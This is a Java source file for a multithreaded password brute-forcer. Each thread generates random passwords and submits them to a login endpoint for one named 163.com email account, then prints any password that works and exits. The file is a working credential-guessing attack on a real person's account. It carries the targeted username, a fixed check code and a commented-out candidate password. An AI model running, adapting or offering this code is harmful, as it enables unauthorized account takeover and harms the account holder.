package main;

/**
 * Created by I322233 on 1/4/2016.
 */
public class Run implements Runnable {
    private int num;
    public Run(int num){
        this.num = num;
    }
    public void run() {
        String password = generateRanPassword(num);
        while(password != null){
            System.out.println("test password:"+password);
            String param = "syscheckcode=7d729bf70be09a8728cc8ee8bf7052a7c61faff7&username=sishan783173fd@163.com&password="+password+"&product=other";
            if(HttpRequest.login(Main.url,param)){
                System.out.println("----------------------------");
                System.out.println("get password:"+password);
                System.out.println("-----------------------------");
                System.exit(0);
                break;
            }

            password = generateRanPassword(num);
        }

    }
    private String generateRanPassword(int num){
        String password = "";
        for(int i=0;i<num;i++){
            password+=Main.getRanChar();
        }
//        password = "gdr@1993";
        return password;
    }
    private synchronized String getPassword(){
        if(Main.passwords.size() > 0){
            return Main.passwords.remove(0);
        }else{
            return null;
        }
    }
    private synchronized void clearPasswords(){
        Main.passwords.clear();
    }
}
